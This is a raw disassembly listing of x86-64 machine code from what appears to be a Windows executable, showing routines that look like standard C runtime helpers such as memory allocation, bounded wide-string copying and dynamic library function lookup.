   14000a54e:	48 3b c3             	cmp    %rbx,%rax
   14000a551:	73 0f                	jae    0x14000a562
   14000a553:	e8 20 a0 ff ff       	call   0x140004578
   14000a558:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000a55e:	33 c0                	xor    %eax,%eax
   14000a560:	eb 5d                	jmp    0x14000a5bf
   14000a562:	48 0f af d9          	imul   %rcx,%rbx
   14000a566:	b8 01 00 00 00       	mov    $0x1,%eax
   14000a56b:	48 85 db             	test   %rbx,%rbx
   14000a56e:	48 0f 44 d8          	cmove  %rax,%rbx
   14000a572:	33 c0                	xor    %eax,%eax
   14000a574:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000a578:	77 18                	ja     0x14000a592
   14000a57a:	48 8b 0d ef 0b 01 00 	mov    0x10bef(%rip),%rcx        # 0x14001b170
   14000a581:	8d 50 08             	lea    0x8(%rax),%edx
   14000a584:	4c 8b c3             	mov    %rbx,%r8
   14000a587:	ff 15 23 6b 00 00    	call   *0x6b23(%rip)        # 0x1400110b0
   14000a58d:	48 85 c0             	test   %rax,%rax
   14000a590:	75 2d                	jne    0x14000a5bf
   14000a592:	83 3d 33 13 01 00 00 	cmpl   $0x0,0x11333(%rip)        # 0x14001b8cc
   14000a599:	74 19                	je     0x14000a5b4
   14000a59b:	48 8b cb             	mov    %rbx,%rcx
   14000a59e:	e8 b1 90 ff ff       	call   0x140003654
   14000a5a3:	85 c0                	test   %eax,%eax
   14000a5a5:	75 cb                	jne    0x14000a572
   14000a5a7:	48 85 ff             	test   %rdi,%rdi
   14000a5aa:	74 b2                	je     0x14000a55e
   14000a5ac:	c7 07 0c 00 00 00    	movl   $0xc,(%rdi)
   14000a5b2:	eb aa                	jmp    0x14000a55e
   14000a5b4:	48 85 ff             	test   %rdi,%rdi
   14000a5b7:	74 06                	je     0x14000a5bf
   14000a5b9:	c7 07 0c 00 00 00    	movl   $0xc,(%rdi)
   14000a5bf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a5c4:	48 83 c4 20          	add    $0x20,%rsp
   14000a5c8:	5f                   	pop    %rdi
   14000a5c9:	c3                   	ret
   14000a5ca:	cc                   	int3
   14000a5cb:	cc                   	int3
   14000a5cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a5d1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a5d6:	57                   	push   %rdi
   14000a5d7:	48 83 ec 40          	sub    $0x40,%rsp
   14000a5db:	8b da                	mov    %edx,%ebx
   14000a5dd:	48 8b d1             	mov    %rcx,%rdx
   14000a5e0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000a5e5:	41 8b f9             	mov    %r9d,%edi
   14000a5e8:	41 8b f0             	mov    %r8d,%esi
   14000a5eb:	e8 4c a9 ff ff       	call   0x140004f3c
   14000a5f0:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000a5f5:	0f b6 d3             	movzbl %bl,%edx
   14000a5f8:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   14000a5fd:	75 1e                	jne    0x14000a61d
   14000a5ff:	85 f6                	test   %esi,%esi
   14000a601:	74 14                	je     0x14000a617
   14000a603:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000a608:	48 8b 88 08 01 00 00 	mov    0x108(%rax),%rcx
   14000a60f:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   14000a613:	23 c6                	and    %esi,%eax
   14000a615:	eb 02                	jmp    0x14000a619
   14000a617:	33 c0                	xor    %eax,%eax
   14000a619:	85 c0                	test   %eax,%eax
   14000a61b:	74 05                	je     0x14000a622
   14000a61d:	b8 01 00 00 00       	mov    $0x1,%eax
   14000a622:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000a627:	74 0c                	je     0x14000a635
   14000a629:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000a62e:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000a635:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000a63a:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000a63f:	48 83 c4 40          	add    $0x40,%rsp
   14000a643:	5f                   	pop    %rdi
   14000a644:	c3                   	ret
   14000a645:	cc                   	int3
   14000a646:	cc                   	int3
   14000a647:	cc                   	int3
   14000a648:	8b d1                	mov    %ecx,%edx
   14000a64a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000a650:	45 33 c0             	xor    %r8d,%r8d
   14000a653:	33 c9                	xor    %ecx,%ecx
   14000a655:	e9 72 ff ff ff       	jmp    0x14000a5cc
   14000a65a:	cc                   	int3
   14000a65b:	cc                   	int3
   14000a65c:	40 53                	rex push %rbx
   14000a65e:	48 83 ec 20          	sub    $0x20,%rsp
   14000a662:	45 33 d2             	xor    %r10d,%r10d
   14000a665:	4c 8b c9             	mov    %rcx,%r9
   14000a668:	48 85 c9             	test   %rcx,%rcx
   14000a66b:	74 0e                	je     0x14000a67b
   14000a66d:	48 85 d2             	test   %rdx,%rdx
   14000a670:	74 09                	je     0x14000a67b
   14000a672:	4d 85 c0             	test   %r8,%r8
   14000a675:	75 1d                	jne    0x14000a694
   14000a677:	66 44 89 11          	mov    %r10w,(%rcx)
   14000a67b:	e8 f8 9e ff ff       	call   0x140004578
   14000a680:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000a685:	89 18                	mov    %ebx,(%rax)
   14000a687:	e8 9c 9a ff ff       	call   0x140004128
   14000a68c:	8b c3                	mov    %ebx,%eax
   14000a68e:	48 83 c4 20          	add    $0x20,%rsp
   14000a692:	5b                   	pop    %rbx
   14000a693:	c3                   	ret
   14000a694:	66 44 39 11          	cmp    %r10w,(%rcx)
   14000a698:	74 09                	je     0x14000a6a3
   14000a69a:	48 83 c1 02          	add    $0x2,%rcx
   14000a69e:	48 ff ca             	dec    %rdx
   14000a6a1:	75 f1                	jne    0x14000a694
   14000a6a3:	48 85 d2             	test   %rdx,%rdx
   14000a6a6:	75 06                	jne    0x14000a6ae
   14000a6a8:	66 45 89 11          	mov    %r10w,(%r9)
   14000a6ac:	eb cd                	jmp    0x14000a67b
   14000a6ae:	49 2b c8             	sub    %r8,%rcx
   14000a6b1:	41 0f b7 00          	movzwl (%r8),%eax
   14000a6b5:	66 42 89 04 01       	mov    %ax,(%rcx,%r8,1)
   14000a6ba:	4d 8d 40 02          	lea    0x2(%r8),%r8
   14000a6be:	66 85 c0             	test   %ax,%ax
   14000a6c1:	74 05                	je     0x14000a6c8
   14000a6c3:	48 ff ca             	dec    %rdx
   14000a6c6:	75 e9                	jne    0x14000a6b1
   14000a6c8:	48 85 d2             	test   %rdx,%rdx
   14000a6cb:	75 10                	jne    0x14000a6dd
   14000a6cd:	66 45 89 11          	mov    %r10w,(%r9)
   14000a6d1:	e8 a2 9e ff ff       	call   0x140004578
   14000a6d6:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000a6db:	eb a8                	jmp    0x14000a685
   14000a6dd:	33 c0                	xor    %eax,%eax
   14000a6df:	eb ad                	jmp    0x14000a68e
   14000a6e1:	cc                   	int3
   14000a6e2:	cc                   	int3
   14000a6e3:	cc                   	int3
   14000a6e4:	40 53                	rex push %rbx
   14000a6e6:	48 83 ec 20          	sub    $0x20,%rsp
   14000a6ea:	45 33 d2             	xor    %r10d,%r10d
   14000a6ed:	48 85 c9             	test   %rcx,%rcx
   14000a6f0:	74 0e                	je     0x14000a700
   14000a6f2:	48 85 d2             	test   %rdx,%rdx
   14000a6f5:	74 09                	je     0x14000a700
   14000a6f7:	4d 85 c0             	test   %r8,%r8
   14000a6fa:	75 1d                	jne    0x14000a719
   14000a6fc:	66 44 89 11          	mov    %r10w,(%rcx)
   14000a700:	e8 73 9e ff ff       	call   0x140004578
   14000a705:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000a70a:	89 18                	mov    %ebx,(%rax)
   14000a70c:	e8 17 9a ff ff       	call   0x140004128
   14000a711:	8b c3                	mov    %ebx,%eax
   14000a713:	48 83 c4 20          	add    $0x20,%rsp
   14000a717:	5b                   	pop    %rbx
   14000a718:	c3                   	ret
   14000a719:	4c 8b c9             	mov    %rcx,%r9
   14000a71c:	4d 2b c8             	sub    %r8,%r9
   14000a71f:	41 0f b7 00          	movzwl (%r8),%eax
   14000a723:	66 43 89 04 01       	mov    %ax,(%r9,%r8,1)
   14000a728:	4d 8d 40 02          	lea    0x2(%r8),%r8
   14000a72c:	66 85 c0             	test   %ax,%ax
   14000a72f:	74 05                	je     0x14000a736
   14000a731:	48 ff ca             	dec    %rdx
   14000a734:	75 e9                	jne    0x14000a71f
   14000a736:	48 85 d2             	test   %rdx,%rdx
   14000a739:	75 10                	jne    0x14000a74b
   14000a73b:	66 44 89 11          	mov    %r10w,(%rcx)
   14000a73f:	e8 34 9e ff ff       	call   0x140004578
   14000a744:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000a749:	eb bf                	jmp    0x14000a70a
   14000a74b:	33 c0                	xor    %eax,%eax
   14000a74d:	eb c4                	jmp    0x14000a713
   14000a74f:	cc                   	int3
   14000a750:	48 8b c1             	mov    %rcx,%rax
   14000a753:	0f b7 10             	movzwl (%rax),%edx
   14000a756:	48 83 c0 02          	add    $0x2,%rax
   14000a75a:	66 85 d2             	test   %dx,%dx
   14000a75d:	75 f4                	jne    0x14000a753
   14000a75f:	48 2b c1             	sub    %rcx,%rax
   14000a762:	48 d1 f8             	sar    $1,%rax
   14000a765:	48 ff c8             	dec    %rax
   14000a768:	c3                   	ret
   14000a769:	cc                   	int3
   14000a76a:	cc                   	int3
   14000a76b:	cc                   	int3
   14000a76c:	40 53                	rex push %rbx
   14000a76e:	48 83 ec 20          	sub    $0x20,%rsp
   14000a772:	33 db                	xor    %ebx,%ebx
   14000a774:	4d 85 c9             	test   %r9,%r9
   14000a777:	75 0e                	jne    0x14000a787
   14000a779:	48 85 c9             	test   %rcx,%rcx
   14000a77c:	75 0e                	jne    0x14000a78c
   14000a77e:	48 85 d2             	test   %rdx,%rdx
   14000a781:	75 20                	jne    0x14000a7a3
   14000a783:	33 c0                	xor    %eax,%eax
   14000a785:	eb 2f                	jmp    0x14000a7b6
   14000a787:	48 85 c9             	test   %rcx,%rcx
   14000a78a:	74 17                	je     0x14000a7a3
   14000a78c:	48 85 d2             	test   %rdx,%rdx
   14000a78f:	74 12                	je     0x14000a7a3
   14000a791:	4d 85 c9             	test   %r9,%r9
   14000a794:	75 05                	jne    0x14000a79b
   14000a796:	66 89 19             	mov    %bx,(%rcx)
   14000a799:	eb e8                	jmp    0x14000a783
   14000a79b:	4d 85 c0             	test   %r8,%r8
   14000a79e:	75 1c                	jne    0x14000a7bc
   14000a7a0:	66 89 19             	mov    %bx,(%rcx)
   14000a7a3:	e8 d0 9d ff ff       	call   0x140004578
   14000a7a8:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000a7ad:	89 18                	mov    %ebx,(%rax)
   14000a7af:	e8 74 99 ff ff       	call   0x140004128
   14000a7b4:	8b c3                	mov    %ebx,%eax
   14000a7b6:	48 83 c4 20          	add    $0x20,%rsp
   14000a7ba:	5b                   	pop    %rbx
   14000a7bb:	c3                   	ret
   14000a7bc:	4c 8b d9             	mov    %rcx,%r11
   14000a7bf:	4c 8b d2             	mov    %rdx,%r10
   14000a7c2:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   14000a7c6:	75 1c                	jne    0x14000a7e4
   14000a7c8:	4d 2b d8             	sub    %r8,%r11
   14000a7cb:	41 0f b7 00          	movzwl (%r8),%eax
   14000a7cf:	66 43 89 04 03       	mov    %ax,(%r11,%r8,1)
   14000a7d4:	4d 8d 40 02          	lea    0x2(%r8),%r8
   14000a7d8:	66 85 c0             	test   %ax,%ax
   14000a7db:	74 2f                	je     0x14000a80c
   14000a7dd:	49 ff ca             	dec    %r10
   14000a7e0:	75 e9                	jne    0x14000a7cb
   14000a7e2:	eb 28                	jmp    0x14000a80c
   14000a7e4:	4c 2b c1             	sub    %rcx,%r8
   14000a7e7:	43 0f b7 04 18       	movzwl (%r8,%r11,1),%eax
   14000a7ec:	66 41 89 03          	mov    %ax,(%r11)
   14000a7f0:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   14000a7f4:	66 85 c0             	test   %ax,%ax
   14000a7f7:	74 0a                	je     0x14000a803
   14000a7f9:	49 ff ca             	dec    %r10
   14000a7fc:	74 05                	je     0x14000a803
   14000a7fe:	49 ff c9             	dec    %r9
   14000a801:	75 e4                	jne    0x14000a7e7
   14000a803:	4d 85 c9             	test   %r9,%r9
   14000a806:	75 04                	jne    0x14000a80c
   14000a808:	66 41 89 1b          	mov    %bx,(%r11)
   14000a80c:	4d 85 d2             	test   %r10,%r10
   14000a80f:	0f 85 6e ff ff ff    	jne    0x14000a783
   14000a815:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   14000a819:	75 0b                	jne    0x14000a826
   14000a81b:	66 89 5c 51 fe       	mov    %bx,-0x2(%rcx,%rdx,2)
   14000a820:	41 8d 42 50          	lea    0x50(%r10),%eax
   14000a824:	eb 90                	jmp    0x14000a7b6
   14000a826:	66 89 19             	mov    %bx,(%rcx)
   14000a829:	e8 4a 9d ff ff       	call   0x140004578
   14000a82e:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000a833:	e9 75 ff ff ff       	jmp    0x14000a7ad
   14000a838:	40 53                	rex push %rbx
   14000a83a:	55                   	push   %rbp
   14000a83b:	56                   	push   %rsi
   14000a83c:	57                   	push   %rdi
   14000a83d:	41 54                	push   %r12
   14000a83f:	41 56                	push   %r14
   14000a841:	41 57                	push   %r15
   14000a843:	48 83 ec 50          	sub    $0x50,%rsp
   14000a847:	48 8b 05 b2 e7 00 00 	mov    0xe7b2(%rip),%rax        # 0x140019000
   14000a84e:	48 33 c4             	xor    %rsp,%rax
   14000a851:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000a856:	4c 8b f9             	mov    %rcx,%r15
   14000a859:	33 c9                	xor    %ecx,%ecx
   14000a85b:	41 8b e8             	mov    %r8d,%ebp
   14000a85e:	4c 8b e2             	mov    %rdx,%r12
   14000a861:	ff 15 19 68 00 00    	call   *0x6819(%rip)        # 0x140011080
   14000a867:	33 ff                	xor    %edi,%edi
   14000a869:	48 8b f0             	mov    %rax,%rsi
   14000a86c:	e8 17 91 ff ff       	call   0x140003988
   14000a871:	48 39 3d 10 13 01 00 	cmp    %rdi,0x11310(%rip)        # 0x14001bb88
   14000a878:	44 8b f0             	mov    %eax,%r14d
   14000a87b:	0f 85 f8 00 00 00    	jne    0x14000a979
   14000a881:	48 8d 0d 70 82 00 00 	lea    0x8270(%rip),%rcx        # 0x140012af8
   14000a888:	33 d2                	xor    %edx,%edx
   14000a88a:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   14000a890:	ff 15 0a 68 00 00    	call   *0x680a(%rip)        # 0x1400110a0
   14000a896:	48 8b d8             	mov    %rax,%rbx
   14000a899:	48 85 c0             	test   %rax,%rax
   14000a89c:	75 2d                	jne    0x14000a8cb
   14000a89e:	ff 15 ec 67 00 00    	call   *0x67ec(%rip)        # 0x140011090
   14000a8a4:	83 f8 57             	cmp    $0x57,%eax
   14000a8a7:	0f 85 e0 01 00 00    	jne    0x14000aa8d
   14000a8ad:	48 8d 0d 44 82 00 00 	lea    0x8244(%rip),%rcx        # 0x140012af8
   14000a8b4:	45 33 c0             	xor    %r8d,%r8d
   14000a8b7:	33 d2                	xor    %edx,%edx
   14000a8b9:	ff 15 e1 67 00 00    	call   *0x67e1(%rip)        # 0x1400110a0
   14000a8bf:	48 8b d8             	mov    %rax,%rbx
   14000a8c2:	48 85 c0             	test   %rax,%rax
   14000a8c5:	0f 84 c2 01 00 00    	je     0x14000aa8d
   14000a8cb:	48 8d 15 3e 82 00 00 	lea    0x823e(%rip),%rdx        # 0x140012b10
   14000a8d2:	48 8b cb             	mov    %rbx,%rcx
   14000a8d5:	ff 15 5d 67 00 00    	call   *0x675d(%rip)        # 0x140011038
   14000a8db:	48 85 c0             	test   %rax,%rax
   14000a8de:	0f 84 a9 01 00 00    	je     0x14000aa8d
   14000a8e4:	48 8b c8             	mov    %rax,%rcx
   14000a8e7:	ff 15 93 67 00 00    	call   *0x6793(%rip)        # 0x140011080
   14000a8ed:	48 8d 15 2c 82 00 00 	lea    0x822c(%rip),%rdx        # 0x140012b20
   14000a8f4:	48 8b cb             	mov    %rbx,%rcx
   14000a8f7:	48 89 05 8a 12 01 00 	mov    %rax,0x1128a(%rip)        # 0x14001bb88
   14000a8fe:	ff 15 34 67 00 00    	call   *0x6734(%rip)        # 0x140011038
   14000a904:	48 8b c8             	mov    %rax,%rcx
   14000a907:	ff 15 73 67 00 00    	call   *0x6773(%rip)        # 0x140011080
   14000a90d:	48 8d 15 1c 82 00 00 	lea    0x821c(%rip),%rdx        # 0x140012b30
   14000a914:	48 8b cb             	mov    %rbx,%rcx
   14000a917:	48 89 05 72 12 01 00 	mov    %rax,0x11272(%rip)        # 0x14001bb90
   14000a91e:	ff 15 14 67 00 00    	call   *0x6714(%rip)        # 0x140011038
   14000a924:	48 8b c8             	mov    %rax,%rcx
   14000a927:	ff 15 53 67 00 00    	call   *0x6753(%rip)        # 0x140011080
   14000a92d:	48 8d 15 14 82 00 00 	lea    0x8214(%rip),%rdx        # 0x140012b48
   14000a934:	48 8b cb             	mov    %rbx,%rcx
   14000a937:	48 89 05 5a 12 01 00 	mov    %rax,0x1125a(%rip)        # 0x14001bb98
   14000a93e:	ff 15 f4 66 00 00    	call   *0x66f4(%rip)        # 0x140011038
   14000a944:	48 8b c8             	mov    %rax,%rcx
   14000a947:	ff 15 33 67 00 00    	call   *0x6733(%rip)        # 0x140011080
   14000a94d:	48 89 05 54 12 01 00 	mov    %rax,0x11254(%rip)        # 0x14001bba8
   14000a954:	48 85 c0             	test   %rax,%rax
   14000a957:	74 20                	je     0x14000a979
   14000a959:	48 8d 15 08 82 00 00 	lea    0x8208(%rip),%rdx        # 0x140012b68
   14000a960:	48 8b cb             	mov    %rbx,%rcx
   14000a963:	ff 15 cf 66 00 00    	call   *0x66cf(%rip)        # 0x140011038
   14000a969:	48 8b c8             	mov    %rax,%rcx
   14000a96c:	ff 15 0e 67 00 00    	call   *0x670e(%rip)        # 0x140011080
   14000a972:	48 89 05 27 12 01 00 	mov    %rax,0x11227(%rip)        # 0x14001bba0
   14000a979:	ff 15 f1 66 00 00    	call   *0x66f1(%rip)        # 0x140011070
   14000a97f:	85 c0                	test   %eax,%eax
   14000a981:	74 1d                	je     0x14000a9a0
   14000a983:	4d 85 ff             	test   %r15,%r15
   14000a986:	74 09                	je     0x14000a991
   14000a988:	49 8b cf             	mov    %r15,%rcx
   14000a98b:	ff 15 af 68 00 00    	call   *0x68af(%rip)        # 0x140011240
   14000a991:	45 85 f6             	test   %r14d,%r14d
   14000a994:	74 26                	je     0x14000a9bc
   14000a996:	b8 04 00 00 00       	mov    $0x4,%eax
   14000a99b:	e9 ef 00 00 00       	jmp    0x14000aa8f
   14000a9a0:	45 85 f6             	test   %r14d,%r14d
   14000a9a3:	74 17                	je     0x14000a9bc
   14000a9a5:	48 8b 0d dc 11 01 00 	mov    0x111dc(%rip),%rcx        # 0x14001bb88
   14000a9ac:	ff 15 d6 66 00 00    	call   *0x66d6(%rip)        # 0x140011088
   14000a9b2:	b8 03 00 00 00       	mov    $0x3,%eax
   14000a9b7:	e9 d3 00 00 00       	jmp    0x14000aa8f
   14000a9bc:	48 8b 0d dd 11 01 00 	mov    0x111dd(%rip),%rcx        # 0x14001bba0
   14000a9c3:	48 3b ce             	cmp    %rsi,%rcx
   14000a9c6:	74 63                	je     0x14000aa2b
   14000a9c8:	48 39 35 d9 11 01 00 	cmp    %rsi,0x111d9(%rip)        # 0x14001bba8
   14000a9cf:	74 5a                	je     0x14000aa2b
   14000a9d1:	ff 15 b1 66 00 00    	call   *0x66b1(%rip)        # 0x140011088
   14000a9d7:	48 8b 0d ca 11 01 00 	mov    0x111ca(%rip),%rcx        # 0x14001bba8
   14000a9de:	48 8b d8             	mov    %rax,%rbx
   14000a9e1:	ff 15 a1 66 00 00    	call   *0x66a1(%rip)        # 0x140011088
   14000a9e7:	4c 8b f0             	mov    %rax,%r14
   14000a9ea:	48 85 db             	test   %rbx,%rbx
   14000a9ed:	74 3c                	je     0x14000aa2b
   14000a9ef:	48 85 c0             	test   %rax,%rax
   14000a9f2:	74 37                	je     0x14000aa2b
   14000a9f4:	ff d3                	call   *%rbx
   14000a9f6:	48 85 c0             	test   %rax,%rax
   14000a9f9:	74 2a                	je     0x14000aa25
   14000a9fb:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000aa00:	41 b9 0c 00 00 00    	mov    $0xc,%r9d
   14000aa06:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000aa0b:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000aa10:	41 8d 51 f5          	lea    -0xb(%r9),%edx
   14000aa14:	48 8b c8             	mov    %rax,%rcx
   14000aa17:	41 ff d6             	call   *%r14
   14000aa1a:	85 c0                	test   %eax,%eax
   14000aa1c:	74 07                	je     0x14000aa25
   14000aa1e:	f6 44 24 40 01       	testb  $0x1,0x40(%rsp)
   14000aa23:	75 06                	jne    0x14000aa2b
   14000aa25:	0f ba ed 15          	bts    $0x15,%ebp
   14000aa29:	eb 40                	jmp    0x14000aa6b
   14000aa2b:	48 8b 0d 5e 11 01 00 	mov    0x1115e(%rip),%rcx        # 0x14001bb90
   14000aa32:	48 3b ce             	cmp    %rsi,%rcx
   14000aa35:	74 34                	je     0x14000aa6b
   14000aa37:	ff 15 4b 66 00 00    	call   *0x664b(%rip)        # 0x140011088
   14000aa3d:	48 85 c0             	test   %rax,%rax
   14000aa40:	74 29                	je     0x14000aa6b
   14000aa42:	ff d0                	call   *%rax
   14000aa44:	48 8b f8             	mov    %rax,%rdi
   14000aa47:	48 85 c0             	test   %rax,%rax
   14000aa4a:	74 1f                	je     0x14000aa6b
   14000aa4c:	48 8b 0d 45 11 01 00 	mov    0x11145(%rip),%rcx        # 0x14001bb98
   14000aa53:	48 3b ce             	cmp    %rsi,%rcx
   14000aa56:	74 13                	je     0x14000aa6b
   14000aa58:	ff 15 2a 66 00 00    	call   *0x662a(%rip)        # 0x140011088
   14000aa5e:	48 85 c0             	test   %rax,%rax
   14000aa61:	74 08                	je     0x14000aa6b
   14000aa63:	48 8b cf             	mov    %rdi,%rcx
   14000aa66:	ff d0                	call   *%rax
   14000aa68:	48 8b f8             	mov    %rax,%rdi
   14000aa6b:	48 8b 0d 16 11 01 00 	mov    0x11116(%rip),%rcx        # 0x14001bb88
   14000aa72:	ff 15 10 66 00 00    	call   *0x6610(%rip)        # 0x140011088
   14000aa78:	48 85 c0             	test   %rax,%rax
   14000aa7b:	74 10                	je     0x14000aa8d
   14000aa7d:	44 8b cd             	mov    %ebp,%r9d
   14000aa80:	4d 8b c4             	mov    %r12,%r8
   14000aa83:	49 8b d7             	mov    %r15,%rdx
   14000aa86:	48 8b cf             	mov    %rdi,%rcx
   14000aa89:	ff d0                	call   *%rax
   14000aa8b:	eb 02                	jmp    0x14000aa8f
   14000aa8d:	33 c0                	xor    %eax,%eax
   14000aa8f:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000aa94:	48 33 cc             	xor    %rsp,%rcx
   14000aa97:	e8 a4 87 ff ff       	call   0x140003240
   14000aa9c:	48 83 c4 50          	add    $0x50,%rsp
   14000aaa0:	41 5f                	pop    %r15
   14000aaa2:	41 5e                	pop    %r14
   14000aaa4:	41 5c                	pop    %r12
   14000aaa6:	5f                   	pop    %rdi
   14000aaa7:	5e                   	pop    %rsi
   14000aaa8:	5d                   	pop    %rbp
   14000aaa9:	5b                   	pop    %rbx
   14000aaaa:	c3                   	ret
   14000aaab:	cc                   	int3
   14000aaac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000aab1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000aab6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000aabb:	57                   	push   %rdi
   14000aabc:	48 83 ec 60          	sub    $0x60,%rsp
   14000aac0:	49 8b d9             	mov    %r9,%rbx
   14000aac3:	41 8b f8             	mov    %r8d,%edi
   14000aac6:	8b f2                	mov    %edx,%esi
   14000aac8:	48 8b e9             	mov    %rcx,%rbp
   14000aacb:	e8 b8 8e ff ff       	call   0x140003988
   14000aad0:	85 c0                	test   %eax,%eax
   14000aad2:	74 7b                	je     0x14000ab4f
   14000aad4:	48 8d 0d 65 6b 00 00 	lea    0x6b65(%rip),%rcx        # 0x140011640
   14000aadb:	ff 15 5f 66 00 00    	call   *0x665f(%rip)        # 0x140011140
   14000aae1:	48 8d 15 f8 89 00 00 	lea    0x89f8(%rip),%rdx        # 0x1400134e0
   14000aae8:	48 8b c8             	mov    %rax,%rcx
   14000aaeb:	ff 15 47 65 00 00    	call   *0x6547(%rip)        # 0x140011038
   14000aaf1:	4c 8b d0             	mov    %rax,%r10
   14000aaf4:	48 85 c0             	test   %rax,%rax
   14000aaf7:	75 09                	jne    0x14000ab02
   14000aaf9:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000aafd:	e9 81 00 00 00       	jmp    0x14000ab83
   14000ab02:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   14000ab09:	44 8b 8c 24 90 00 00 	mov    0x90(%rsp),%r9d
   14000ab10:	00 
   14000ab11:	83 64 24 4c 00       	andl   $0x0,0x4c(%rsp)
   14000ab16:	48 83 64 24 58 00    	andq   $0x0,0x58(%rsp)
   14000ab1c:	89 44 24 44          	mov    %eax,0x44(%rsp)
   14000ab20:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000ab27:	89 44 24 48          	mov    %eax,0x48(%rsp)
   14000ab2b:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000ab30:	44 8b c7             	mov    %edi,%r8d
   14000ab33:	8b d6                	mov    %esi,%edx
   14000ab35:	48 8b cd             	mov    %rbp,%rcx
   14000ab38:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   14000ab3f:	00 
   14000ab40:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000ab45:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   14000ab4a:	41 ff d2             	call   *%r10
   14000ab4d:	eb 34                	jmp    0x14000ab83
   14000ab4f:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000ab55:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   14000ab5c:	4c 8b cb             	mov    %rbx,%r9
   14000ab5f:	0b 84 24 a0 00 00 00 	or     0xa0(%rsp),%eax
   14000ab66:	44 8b c7             	mov    %edi,%r8d
   14000ab69:	8b d6                	mov    %esi,%edx
   14000ab6b:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000ab6f:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
   14000ab76:	48 8b cd             	mov    %rbp,%rcx
   14000ab79:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000ab7d:	ff 15 c5 66 00 00    	call   *0x66c5(%rip)        # 0x140011248
   14000ab83:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   14000ab88:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000ab8c:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   14000ab90:	49 8b 73 20          	mov    0x20(%r11),%rsi
   14000ab94:	49 8b e3             	mov    %r11,%rsp
   14000ab97:	5f                   	pop    %rdi
   14000ab98:	c3                   	ret
   14000ab99:	cc                   	int3
   14000ab9a:	cc                   	int3
   14000ab9b:	cc                   	int3
   14000ab9c:	48 8b c4             	mov    %rsp,%rax
   14000ab9f:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000aba3:	4c 89 40 18          	mov    %r8,0x18(%rax)
   14000aba7:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000abab:	55                   	push   %rbp
   14000abac:	56                   	push   %rsi
   14000abad:	57                   	push   %rdi
   14000abae:	41 54                	push   %r12
   14000abb0:	41 55                	push   %r13
   14000abb2:	41 56                	push   %r14
   14000abb4:	41 57                	push   %r15
   14000abb6:	48 8d 68 b9          	lea    -0x47(%rax),%rbp
   14000abba:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000abc1:	33 ff                	xor    %edi,%edi
   14000abc3:	41 b7 80             	mov    $0x80,%r15b
   14000abc6:	41 8b f1             	mov    %r9d,%esi
   14000abc9:	48 8b da             	mov    %rdx,%rbx
   14000abcc:	c7 45 ef 18 00 00 00 	movl   $0x18,-0x11(%rbp)
   14000abd3:	44 8d 77 01          	lea    0x1(%rdi),%r14d
   14000abd7:	89 7d df             	mov    %edi,-0x21(%rbp)
   14000abda:	40 88 7d 67          	mov    %dil,0x67(%rbp)
   14000abde:	48 89 7d f7          	mov    %rdi,-0x9(%rbp)
   14000abe2:	45 84 cf             	test   %r9b,%r15b
   14000abe5:	74 08                	je     0x14000abef
   14000abe7:	89 7d ff             	mov    %edi,-0x1(%rbp)
   14000abea:	41 b4 10             	mov    $0x10,%r12b
   14000abed:	eb 07                	jmp    0x14000abf6
   14000abef:	44 89 75 ff          	mov    %r14d,-0x1(%rbp)
   14000abf3:	44 8a e7             	mov    %dil,%r12b
   14000abf6:	48 8d 4d df          	lea    -0x21(%rbp),%rcx
   14000abfa:	e8 fd 20 00 00       	call   0x14000ccfc
   14000abff:	85 c0                	test   %eax,%eax
   14000ac01:	0f 85 37 07 00 00    	jne    0x14000b33e
